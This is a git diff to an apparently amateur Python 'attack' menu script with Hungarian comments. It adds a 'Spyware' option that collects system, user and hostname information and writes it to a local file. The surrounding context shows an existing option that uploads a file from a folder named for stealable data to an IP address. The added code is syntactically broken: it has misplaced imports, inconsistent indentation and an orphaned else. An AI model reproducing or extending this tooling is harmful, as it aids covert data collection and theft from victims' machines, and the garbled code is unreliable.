@@ -20,6 +20,7 @@ def Banner():
     print()
     print("IP-ATTACK[2]")
     print()
+    print("Spyware[3]")
 Banner()    
 x = int(input("Enter the attack number: "))
 if x == 1:
@@ -89,6 +90,38 @@ if x == 2:
     fajl_nev = r"C:\Users\Hp\OneDrive\Asztali gép\ellopható adatok"  
 
     fajl_feltoltes(ip_cim, fajl_nev)
+if x == 3:
+import socket
+import platform
+import os
 
+
+   # Rendszer információk gyűjtése
+    def get_system_info():
+       return f"System: {platform.system()}\nNode: {platform.node()}\nRelease: {platform.release()}\nVersion: {platform.version()}\nMachine: {platform.machine()}\nProcessor: {platform.processor()}"
+
+# Felhasználói adatok gyűjtése
+def get_user_info():
+    return f"User: {os.getlogin()}\nHome dir: {os.path.expanduser('~')}\nCurrent dir: {os.getcwd()}"
+
+# Hálózati információk gyűjtése
+def get_network_info(ip_address):
+    try:
+        hostname = socket.gethostbyaddr(ip_address)[0]
+    except socket.herror:
+        hostname = 'Nincs találat'
+    return f"IP Address: {ip_address}\nHostname: {hostname}"
+
+# Adatok kiírása fájlba
+def write_to_file(data):
+    with open('gyujtott_adatok.txt', 'w') as f:
+        f.write(data)
+
+# IP-cím bekérése
+ip_address = input('Kérem az IP-címet: ')
+
+# Hálózati információk gyűjtése és kiírása
+network_info = get_network_info(ip_address)
+write_to_file(network_info)
 else:
     print("Fatal ERROR")    
